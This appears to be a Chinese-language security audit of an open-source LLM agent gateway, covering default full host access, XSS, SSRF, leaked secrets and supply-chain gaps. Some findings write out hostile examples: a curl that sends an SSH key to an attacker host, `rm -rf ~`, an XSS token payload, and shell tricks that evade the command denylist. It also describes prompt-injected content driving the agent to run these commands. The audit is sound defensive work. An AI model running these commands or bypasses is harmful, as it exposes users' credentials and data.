# OpenSquilla 安全审计报告

- **审计对象**：https://github.com/opensquilla/opensquilla（v0.5.3，commit `20302db`，2026-08-18）
- **技术栈**：Python 3.12 / Starlette 网关 + SQLite（sqlmodel/aiosqlite）+ MCP 原生工具 + 多 IM 渠道（Telegram/飞书/DingTalk/QQ/MS Teams）+ Vue 3 WebUI + Electron 桌面端
- **方法**：全仓浅克隆 → 6 个并行专项审计（Gateway 层 / 命令执行与沙箱 / SSRF 与网络 / 密钥与加密 / 前端 WebUI / 供应链与部署）→ 所有关键发现经交叉复核（file:line 验证）
- **代码规模**：约 2,480 个 Python 文件 + 869 个前端文件

---

## 总体评价

**安全架构设计水平高**：沙箱（bubblewrap/seccomp/seatbelt）、SSRF 防护（DNS 解析+IP 封锁+连接 pinning 反 DNS rebinding）、令牌哈希存储+常数时间比较、RPC 集中 scope 鉴权、渠道 webhook 签名校验、日志密钥脱敏、Electron 加固、`uv.lock` 全量哈希锁定、非 root Docker 运行等，均达到同类开源 agent 项目中的上游水准。

**但默认配置是"最大开放姿态"（out-of-box bypass posture）**：这是本项目最核心的安全问题——沙箱、审批、敏感路径防护等所有保护层在默认配置下**全部关闭**；网关默认无认证（`auth.mode=none`），仅靠回环绑定兜底。审计发现的问题大多与"默认值过宽"有关，而非实现缺陷。

### 发现统计

| 严重度 | 数量 | 说明 |
|---|---|---|
| 严重 | 2 | 默认 FULL 主机访问；网关自保守卫失效 |
| 高 | 13 | 网关 XSS、DOMPurify mXSS、password 认证 fail-open、子进程密钥外溢、Telegram token 日志泄露、http_request/捆绑技能无 SSRF、生产安装依赖未锁定等 |
| 中 | 28 | 限流绕过、下载路由缺授权、scheduler.db 权限、网络守卫 fail-open、桌面更新无分离签名、MCP 无校验、webhook 可重放等 |
| 低/信息 | 25+ | 错误回显、WS 无限流、token 进 URL、CI action 未 pin SHA 等 |

---

## 严重（Critical）

### C-1 默认配置 = Full Host Access：LLM 可执行任意主机命令，无沙箱、无审批、无敏感路径防护 ✅已复核

**证据链（全部复核）**：
- `opensquilla.toml.example:525-528`：`sandbox = false`、`security_grading = false`，注释自述 "Both default to false for the **out-of-box bypass posture**"；`:545` `[permissions] default_mode = "bypass"`
- `src/opensquilla/sandbox/config.py:95`：`run_mode: RunModeName = "full"`（默认值即 full）
- `src/opensquilla/tools/run_mode.py:51-61`：`full_host_access_for_context()` 在 `runtime.effective.sandbox_enabled` 为 False 时返回 True（除非显式设置 `OPENSQUILLA_SANDBOX_DISABLED_FULL_HOST=off`）
- `src/opensquilla/tools/builtin/shell.py:6439-6467`：`exec_command` 在 full host access 时**最先早退**，直接 `_run_full_host_shell_command`（docstring 明言 "without sandbox policy or safety preflight"），绕过 denylist/审批/写策略
- 同样早退存在于 `background_process`（shell.py:6946）与 `execute_code`（code_exec.py:949-980）

**影响**：默认部署下，一次 LLM 工具调用（可由任意提示词/被提示注入的内容触发）即可 `cat ~/.ssh/id_rsa`、`curl https://attacker/$(cat ~/.ssh/id_rsa)`、`rm -rf ~`，无任何策略层拦截。用户只有明确执行 `opensquilla sandbox on` 才启用保护——与"开箱即用安全"的产品预期相反。

**修复**：默认 `run_mode` 改为 `safe`；示例配置删除 `sandbox=false`/`default_mode="bypass"`；"无沙箱即 FULL"的 fallback 改为 fail-closed。

### C-2 网关"自保守卫"声明与实际不符：FULL 模式下 agent 可杀死网关进程 ✅已复核

- `shell_policy.py:95-102` 声称 `check_gateway_self_kill` "applies in **every host mode, including full/auto host access**"
- 但实际调用点（shell.py:6493、:6978）都位于各自函数 FULL 早退（:6439、:6946）**之后**——默认配置下永远执行不到
- 影响：LLM（或被提示注入的内容）可 `kill -9 <gateway pid>` / `Stop-Process -Id ...` 直接杀死宿主进程，造成服务 DoS

---

## 高（High）

### H-1 反射型 XSS：`?token=` 注入控制面内联脚本 → 控制平面完全接管 ✅已复核

- **位置**：`control_ui.py:120`（自定义 `tojson` 过滤器 = 裸 `json.dumps`，不转义 `<`/`>`）、`control_ui.py:188-194`（`_link_token_from_request` 原样取 `?token=`）、`templates/index.html:42`（`var token = {{ link_token | tojson | safe }}`）
- **机理**：构造 `http://127.0.0.1:18791/control/?token=</script><script>…</script>`，`</script>` 提前闭合脚本块，攻击者脚本以网关源执行。控制 UI 对未认证请求开放，无凭据即可触发；no-auth 模式下浏览器即"回环 owner"，注入脚本可同源调全部 admin RPC（含 `secrets.resolve`、`config.get`、`chat.inject`）
- **修复**：删除自定义 `tojson`（改 `ensure_ascii=True`）或去掉 `| safe`；对 `link_token` 做字符白名单

### H-2 上传/转写端点无请求体大小预检 → 内存/磁盘耗尽 DoS

- `uploads.py:404,430-434`：`request.form()` 完整解析 multipart、`upload.read()` 整包读入后才判大小；`audio_transcription.py:65,83-93` 读完后才查 30MiB 上限
- 300MiB 聚合上限只约束入库后字节，拒绝路径上任意大小上传被完整读入内存
- **修复**：解析前检查 `Content-Length`；流式边读边计数

### H-3 前端 DOMPurify 3.4.12 受已知 mXSS 影响（GHSA-55q2-fjhq-7xh7）✅已复核

- `package-lock.json` 锁定 `dompurify@3.4.12`（修复版 3.4.13）；`useChatTextRendering.ts:76-81` 注册的 `uponSanitizeElement` 钩子恰为公告描述的"IN_PLACE hook removal"易受影响模式
- 聊天全链路 17 处 `v-html` 依赖该净化器输出（TextPart/StreamingTextPart/ActivityNarration/PlanCard 等）；触发即控制面板源 XSS → 窃取 sessionStorage wsToken → 完全接管本地网关
- 参考：[GitHub Advisory GHSA-55q2-fjhq-7xh7](https://github.com/advisories/GHSA-55q2-fjhq-7xh7)、[GitLab 公告](https://advisories.gitlab.com/npm/dompurify/GHSA-55q2-fjhq-7xh7/)
- **修复**：升级 `dompurify ≥ 3.4.13`（一行改动）

### H-4 `auth.mode = "password"` 静默禁用 HTTP 认证（fail-open）✅已复核

- `middleware.py:148-193` 只实现 `none`/`token`/`trusted-proxy` 三分支；`mode == "password"` 不匹配任何分支 → 直接放行
- `auth.py:_RESOLVERS` 只注册 `"token"`/`"none"`（:359-362），WebSocket 路径对 password 模式反而 fail-closed——HTTP 与 WS 行为不一致
- 配置注释 `# none | token | password` 暗示 password 受支持；操作员按文档配 password + 绑定 0.0.0.0 时，远程攻击者**无凭据访问全部 HTTP API**，而操作员相信已有口令保护
- **修复**：`mode` 加取值校验（fail-closed）；未实现的分支拒绝启动

### H-5 agent 子进程继承完整网关环境（全部 API key 可达）✅已复核

- `env.py:149-152` 把 `.env` 全部密钥注入 `os.environ`；`shell.py:1047-1054` 非 guest 会话直接 `dict(os.environ)` 作为子进程环境
- agent 执行的任何命令可一键 `env` / 读 `/proc/<pid>/environ` 提取 OPENROUTER_API_KEY、bot token、`OPENSQUILLA_AUTH_TOKEN` 等全部凭据
- 与 C-1 叠加：默认配置下"能执行任意命令 + 环境里全是密钥"= 密钥唾手可得
- **修复**：子进程构造白名单环境（剥离 `*_API_KEY`/`OPENSQUILLA_*`），密钥按需传入

### H-6 Safe 模式命令前缀策略可被 shell 语法绕过

- `command_policy.py:269-385` 用 `shlex.split` 分词做前缀匹配，但实际执行原始命令字符串（`sh -lc command`）
- `echo $(sudo cat /etc/shadow)`、`` echo `rm -rf ~` ``、`x='rm -rf ~'; $x` 等可绕过前缀判断；默认 `auto_allow_prefixes` 为空、未知命令默认 `AUTO`
- 正则 denylist 可被引号拼接/`$IFS`/编码绕过（`rm -rf $'/'` 等）
- **缓解**：若 OS 沙箱正确启用，命令实际动作仍受挂载/网络策略约束（纵深失效而非直接逃逸）

### H-7 沙箱 elevation 自动评审默认放行

- `engine/elevation_triage.py:356-386`："unknown actions **default to allow**"；critical 规则为正则且可绕过（`base64|openssl|python -c` 变体）
- 非 Safe 模式上下文走规则自动审批，主机执行可无人工干预获批

### H-8 生产安装路径依赖完全未锁定（可被上游恶意版本静默替换）✅已复核

- `pyproject.toml:17-61` 全部依赖仅 `>=` 下界；`.dockerignore:72` 把 `uv.lock` 排除出构建上下文；`Dockerfile:98` 用 `pip install ".[recommended]"` 从 PyPI 现解析最新版
- 项目维护 680KB `uv.lock`、CI 用 `uv sync --frozen`，但**所有面向用户/产物的路径都不走锁文件**：Docker 镜像构建、wheel 安装（`uv tool install`）、Homebrew 公式均现解析
- 任何直接/传递依赖上游包被接管或发布恶意新版本时，全新安装与镜像构建无告警拉入（dependency confusion 同类风险）
- **修复**：Dockerfile 改用 `uv sync --frozen`；wheel 发布用锁定解析结果生成精确 pin 元数据

### H-9 Homebrew Formula sha256 为全零占位、版本陈旧

- `Formula/opensquilla.rb:12-13`：`url ... v0.1.0.tar.gz` + `sha256 "0000…0"` 占位符，与现状（v0.5.3）脱节——当前 `brew install` 必失败；若为修复而删除校验行则完整性校验彻底消失
- 公式注释自认 first-draft，运行时依赖从 PyPI 现解析无任何 pin

### H-10 Telegram bot token 经请求 URL 泄入日志与运维可见的 `start_errors` ✅已复核

- `telegram.py:222`（`client.post(f"/bot{self.config.token}/{method}")` token 嵌 URL 路径）、`:244`（`raise_for_status()` 的 `HTTPStatusError` 字符串含完整 URL+token）、`:335-340`（轮询循环捕获一切异常并 `log.warning(..., error=str(exc))`）、`manager.py:253-255`（`str(result)`/`repr(result)` 存入 `_start_errors` 供运维 RPC 读取）
- 任意一次 Telegram 4xx/5xx（轮询模式下 429 限流属常态）即把完整 bot token 写入结构化日志与运维界面；token 可完全冒充机器人收发消息
- **修复**：通道错误统一脱敏（复用 `dingtalk.py:119-151` 的 httpx 日志过滤器与 `redaction.py`）

### H-11 `http_request` 工具无自包含 SSRF 防护（默认形态下可直达云元数据/内网）✅已复核

- `web.py:47-50`（`_validate_http_url` 仅校验 scheme）、`web.py:452,472-481`（httpx 直连）；同文件 `web_fetch` 无条件调用 `validate_http_url_for_fetch`，`http_request` 没有
- 防护完全依赖沙箱托管代理；默认 Full Host Access（C-1）下无代理、请求直连任意 http(s) 主机——LLM 可请求 `http://169.254.169.254/latest/meta-data/...`、`http://127.0.0.1:<端口>`，且全量回传响应头与响应体；敏感载荷标记只拦含 token/secret 特征的 URL，元数据路径不含这些特征不构成拦截
- **修复**：`http_request` 内直接调用 `validate_http_url_for_fetch` + `pinned_transport`（对齐 `web_fetch`）

### H-12 捆绑技能脚本 `http_fetch.py` / `image_download.py` 无任何 SSRF 防护 ✅已复核

- `skills/bundled/http-fetch/scripts/http_fetch.py:36,61-66`（`urllib.request.urlopen`，仅 http/https 前缀校验）；`skills/bundled/awesome-webpage-image-download/scripts/image_download.py:97-101,141-152`（正则从 LLM 提供的搜索结果提取 URL 后无守卫抓取，且循环写盘）
- urllib 默认跟随重定向且不重校验；Safe 模式下靠 OS 沙箱网络隔离兜底，Full Host Access（默认）下完全裸露；URL 来源含搜索结果文本（攻击者可影响）

### H-13 MCP 客户端无安全校验（stdio 任意命令执行 / SSE 零 SSRF 防护）

- `mcp/stdio.py:58-64`：`command`/`args` 无白名单（npx/node/python 等）、无沙箱包装、继承完整环境——配置（含迁移导入的外来配置）即任意命令执行
- `mcp/sse.py:70-101,186-199`：`config.url` 不做私网/回环/元数据 IP 校验、无 `pinned_transport`——配置指向 `http://169.254.169.254` 即裸连
- 属配置信任域（无运行时直接触发路径），但与代码库 web_fetch 的标准不一致，迁移导入会扩大暴露面

---

## 中（Medium）

### 网关层
- **M-1 限流可被伪造 `X-Forwarded-For` 绕过**（middleware.py:255-261，无条件信任 XFF 首段）✅已复核——每请求轮换伪造 XFF 即无限绕过 100 次/分窗口
- **M-2 制品/附件/历史路由缺少授权校验 + 默认会话 key 可预测**（artifacts.py:164-199、attachments.py:60-106 仅凭 `sessionKey` 放行；`session/keys.py:41-43` WebChat 默认 key 为确定性 `agent:main:webchat:default`，且 `app.py:719` 把它设为 `/api/chat/history` 的**缺省参数**——no-auth 模式无 sessionKey 请求即命中主会话）✅已复核——no-auth + 0.0.0.0 绑定时，任意对等端可下载/读取默认会话全部制品、附件与聊天历史
- **M-3 token 经 URL 查询串传递**（middleware.py:202、origin_guard.py:50）——进浏览器历史/代理日志/HTML 回显；已部分缓解（access log 关闭、Referrer-Policy）
- **M-4 no-auth 模式下上传/转写端点对任意对等端开放**（uploads.py:390-401、audio_transcription.py:45-56）✅已复核——存储占满 + 付费 ElevenLabs 转写资费滥用
- **M-5 `trusted-proxy` 模式可被伪造 XFF 绕过**（middleware.py:185-191 只检查代理 IP 是否"出现在" XFF 串）✅已复核

### 前端层
- **M-6 skill.homepage 直接绑 `:href` 无协议校验**（SkillDetailDialog.vue:168）——恶意 skill 可声明 `javascript:` 链接 ✅已复核
- **M-7 token 存 sessionStorage + wsUrl 无同源校验**（stores/rpc.ts:62-76）——单点 XSS 即全量凭证失窃

### 沙箱/命令层
- **M-8 网络守卫对公网 fail-open，元数据主机仅改写 reason 不拦截**（network_guard.py:201-207、:42-48）——实际阻断靠代理"连接时解析"，fake-IP CIDR 误配可放行真实内网段
- **M-9 一键关闭环境变量逃生舱**：`OPENSQUILLA_SENSITIVE_PATHS_DISABLED=1` 使敏感路径硬阻断层 no-op（sensitive_paths.py:24-26）
- **M-10 `run_sandboxed` 的 network 限制仅 advisory**（safety/sandbox.py:12-16、:133-135）——noop 后端下"网络拒绝"不生效

### 密钥/存储层
- **M-11 `scheduler.db` 以默认 umask 创建（常见 0644 世界可读），内含 webhook token**（scheduler/persistence.py:359-369 无 chmod；对照 migrator.py 对会话库明确 chmod 0600）✅已复核
- **M-12 `trusted-proxy` 未配置 `trusted_proxy` 时 fail-open**（middleware.py:185-192 `if proxy and ...`，proxy 为空即跳过）
- **M-13 `link_token` URL 注入页面 HTML**（control_ui.py:188-208）——同源 XSS/能读页面的进程可取得
- **M-14 `logs.tail` RPC 原文返回日志行，读取端不 scrub**（rpc_logs.py:178-209）

### 供应链层
- **M-15 桌面自动更新通道：SHA256SUMS 与产物同渠道自发布，无分离签名**（update-channel.ts:3-10 更新源=GitHub Releases+阿里云 OSS；update-verification.ts:149-153 仅与同渠道 SHA256SUMS 比对；Windows 安装包未 Authenticode 签名）✅已复核——OSS bucket 写权限失守即可同时替换 manifest、校验文件与安装包，向所有桌面客户端推送"通过自身校验"的恶意更新
- **M-16 安装脚本不校验 release wheel 的 SHA256SUMS**（发布流水线 wheelhouse-release.yml 生成了 SHA256SUMS，但 install.sh:231/install.ps1:247 从不核对）
- **M-17 CI 第三方 action 全部 pin 可变 tag 未 pin commit SHA**（setup-uv@v5、setup-qemu@v3 等；发布工作流接触签名 secret 与阿里云 AK，被投毒后果严重）
- **M-18 Docker 基础镜像 `node:22.12.0-bookworm-slim` / `python:3.13-slim-bookworm` 未 pin digest**
- **M-19 镜像与 wheel 无 SLSA/attestation 与 SBOM**（docker-image.yml:154 `provenance: false` 显式关闭）

### SSRF/工具层
- **M-20 `media.analyze` 以 `enforce=False` 绕过集中网络门**（media.py:158）——自带 SSRF 防护使 SSRF 本身受控，但运营者域名 allowlist 对其无效
- **M-21 `html-to-pdf/render.py` 接受 `file://` 输入**（render.py:20）——LLM 可把任意本地文件渲染成 PDF 后再读取，构成本地文件读取面 ✅已复核
- **M-22 no-auth + 公开绑定（0.0.0.0）时远程对等体获得 read/write 代理控制面**（auth.py:201-270 非 loopback 仍发 `REMOTE_OPERATOR_SCOPES`）——可远程驱动 agent 回合、读会话/配置/日志/记忆、写沙箱策略（admin/approvals/pairing 与 host-execute 已排除）
- **M-23 WeCom `corp_secret` 经查询串发送**（wecom.py:297-303 `gettoken?corpsecret=...`，协议要求）——出站 URL 含密钥，需像 dingtalk.py:119-151 那样对 httpx 日志做脱敏（当前缺失）
- **M-24 Feishu/WeCom webhook 验签但无时间戳新鲜度窗口（可重放）** ✅已复核——`feishu.py:425-433` 计算 HMAC 但从不校验 `|now - timestamp|`，捕获的已签名请求可无限重放（重复事件注入/副作用重放）
- **M-25 cron webhook 投递仅 scheme 校验**（scheduler/delivery.py:40-53）——`validate_webhook_url` 只查 http/https+hostname，无 SSRF/IP 校验，cron 可向内网/元数据地址投递
- **M-26 附件下载缺 SSRF 纵深**（_attachment_io.py:129-145 无 IP 校验/无 pinning）——URL 来源为 IM 渠道附件链接，受信度中等，属防御纵深缺口
- **M-27 token 模式下渠道 webhook 被网关令牌拦截**——webhook 路由不在 `PUBLIC_PATHS`（middleware.py:116-126），token 模式回调 401；若按文档用 `?token=` 自救，主令牌进 webhook URL 泄露给 Telegram/飞书服务器与日志
- **M-28 MS Teams 凭据校验依赖 BotBuilder SDK 且 `service_url` 出站外带**（msteams.py:296-302/393）——空 appId/password 边界下 SDK JWT 校验行为需核实；`service_url` 来自入站 activity 并用于出站回复，属条件性风险（子代理标注"当前 _HIDDEN"）

---

## 低（Low）与信息（Info）精选

- **L-1** 500 错误回显 `str(exc)`（middleware.py:293-302）——异常细节/路径/SQL 片段泄露
- **L-2** WebSocket 无连接数/帧速率限制（限流中间件不覆盖 WS scope）——连接洪水 DoS
- **L-3** hello 消息泄露 `config_path`/`state_dir`；/api 版本/provider 信息暴露（websocket.py:1074-1077、app.py:253-261）
- **L-4** 上传/转写端点 token 比较非常数时间（`!=`）（uploads.py:391、audio_transcription.py:46）
- **L-5** `Host` 头注入 `ws_url` 并回显进内联脚本（control_ui.py:124-131）——DNS rebinding 场景下 token 可能被送往攻击者 WS 端点
- **L-6** 生产打包 source map 可下载（control_ui.py:88-91）
- **L-7** 前端 CSP `script-src 'unsafe-inline'`（middleware.py:327-338）
- **L-8** 安装脚本 `curl -LsSf https://astral.sh/uv/install.sh | sh` / `Invoke-Expression`（install.sh:185、install.ps1:163）——无签名/哈希校验（wheel 本身来自 GitHub Releases HTTPS，版本受正则约束）
- **L-9** GitHub Actions 第三方 action 以 tag 引用（@v4/@v5）未 pin commit SHA
- **L-10** Docker 基础镜像 `python:3.13-slim-bookworm` 浮动 tag 未 pin digest
- **L-11** 内置 skill 脚本接受 `--api-key` 命令行参数（skills/bundled/.../openrouter_video.py:175）——argv 对 `ps` 可见
- **L-12** 迁移文件存在两个 V010 版本号重复（`V010__transcript_turn_usage.py` / `V010__meta_skill_runs.py`）——功能/部署隐患（非安全）
- **L-13** 渠道层：Telegram token 比较非常数时间（telegram.py:405-408）；可配置 `api_base` 无域名白名单；MS Teams 出站会话引用回退可能错发对话（msteams.py:433-441/455-461）
- **I-1** WeCom 回调加密：确定性 IV、padding 未校验、解密错误可区分（不可外部利用——两条解密路径均在验签后）
- **I-2** 无应用层 at-rest 加密：API key 明文存 `opensquilla.toml`（0600 保护）或 env；env 来源密钥不落盘（runtime-secret 机制，设计成熟）
- **I-3** engine/provider 出站 HTTP 全部为配置派生（embedding.py:134-151、ollama.py:337 等用配置 `base_url`），无 SSRF 校验但无攻击者可控运行时输入——配置信任域，建议配置加载层统一校验（纵深）
- **I-4** MCP 工具名/描述/schema 无净化（mcp/discovery.py:81-90）——元数据来自已安装的 MCP server 配置，属配置信任域

---

## 亮点（做得好的，未发现问题项）

- **默认绑定 `127.0.0.1:18791`**（gateway_cmd.py:177），compose 只发布回环端口并明示警告
- **CSRF/DNS rebinding 防护完整**：`UnsafeOriginGuardMiddleware` + 路由级 `_same_origin` + WS origin 校验（middleware.py:100-110、origin_guard.py:113-148、websocket.py:918-924）
- **SSRF 防护专业（核心工具）**：`ssrf.py` DNS 解析+私有/环回/link-local/reserved IP 封锁+连接 pinning（返回 vetted IP 供调用方钉住，反 TOCTOU）；web_fetch/media/_provider_http 每跳重定向重新校验+敏感 URL/body 拦截（web_fetch.py:287-322）；云 metadata IP 硬阻断；十进制/十六进制 IP、127.1、尾点域名、userinfo@host、IDN/Unicode、IPv4-mapped IPv6 等绕过手法经专项验证**均无效**（注：`http_request` 与两个捆绑技能脚本除外，见 H-11/H-12）
- **令牌工程**：`secrets.token_*` 生成、无盐 SHA-256 摘要存储 + `compare_digest` + dummy digest 抗时序（token_store.py:52-53,174）、认证失败限流退避（60s/5 次+指数退避）
- **RPC 集中 scope 鉴权**：注册表启动时审计方法面，未分类方法启动即失败（rpc/registry.py:267-285、scopes.py）
- **渠道 webhook 签名校验**：Telegram secret token（telegram.py:405-408）、飞书 HMAC+加密（feishu.py:163-181）、Slack signing secret（slack.py:720-734）（注：验签均无时间戳新鲜度窗口，见 M-24）
- **沙箱（启用时）配置正确**：bwrap `--unshare-user/pid/net --cap-drop ALL --clearenv`、无可用后端 fail-closed 不降级（backend/__init__.py:130-135）、seatbelt 网络规则、Windows WFP
- **日志/异常密钥脱敏**：provider 边界精确密钥替换+scrub `__context__`（provider/error_redaction.py）、structlog 全仓无日志记录密钥值（注：Telegram 通道例外，见 H-10）
- **Electron 加固**：`contextIsolation: true`、`nodeIntegration: false`、`sandbox: true`（main.ts:6245-6247）；deep link 严格校验；桌面运行时 manifest 全资产 SHA256 pin（fetch-bundled-runtimes.mjs:47-82）
- **供应链基线（开发侧）**：`uv.lock` 全量 sha256 哈希锁定 + CI `uv sync --frozen`；`.env` 已 gitignore；配置写入 0600；Docker 非 root（uid 10001）+ healthcheck；`.dockerignore` 排除 `.env`/密钥；`SECURITY.md` 提供私有漏洞报告渠道；发布流水线 Draft release + 多重回审（注：生产安装路径不走锁文件，见 H-8）
- **依赖已知 CVE 覆盖良好（专项核对）**：`starlette>=0.40` 覆盖 [CVE-2024-47874](https://ubuntu.com/security/CVE-2024-47874)（multipart DoS）；`python-multipart>=0.0.20` 覆盖 [CVE-2024-53981](https://ubuntu.com/security/CVE-2024-53981) 与 [USN-8027-1](https://ubuntu.com/security/notices/USN-8027-1) 路径穿越；`cryptography>=42` 高于 CVE-2024-26130/CVE-2024-12705 修复线——**新安装不受上述已知 CVE 影响**，残余风险仅在无上限的范围本身（H-8）
- **prompt 注入缓解非摆设**：`wrap_untrusted` XML 转义包裹不可信内容 + 工具执行前 `extract_tool_call_refusal_reason` 真实拒绝（dispatch.py:458-481）
- **git 工具无注入面**：全 arglist 传递、`--` 分隔、无 shell=True；`git push` 强制审批
- **guest 会话无升级路径**：guest_safe 强制非 FULL、独立临时 workspace/home

---

## 修复优先级建议

1. **立即**（阻断默认配置下的主机接管与一键 XSS）：
   - C-1：反转默认 run_mode 为 `safe`；示例配置删除 bypass 姿态；无沙箱时 fail-closed
   - C-2：把 `check_gateway_self_kill` 等结构守卫提到所有 host 执行入口之前
   - H-1（网关 XSS）：删除 `| safe`/白名单校验 token（改动极小）
   - H-3（前端）：升级 `dompurify ≥ 3.4.13`
2. **尽快**：
   - H-4：password 模式 fail-closed 或实现
   - H-5：子进程环境剥离密钥
   - H-10：Telegram 通道错误脱敏（token 已进日志）
   - H-11/H-12：`http_request` 与捆绑技能脚本补 SSRF 校验
   - H-2（上传 body 预检）；M-1（XFF 信任）；M-2（下载路由授权）
3. **计划内**：
   - H-6/H-7：命令策略默认 APPROVAL/DENY、elevation 默认 deny
   - H-8/H-9：生产安装路径锁定（Docker 用 `uv sync --frozen`）、修复 Homebrew 公式
   - H-13、M-3~M-22、L-1~L-12

---

*本报告基于静态审计，未进行动态利用验证。所有高危以上发现均经代码级复核（file:line）。审计 commit：`20302db`（2026-08-18）。*
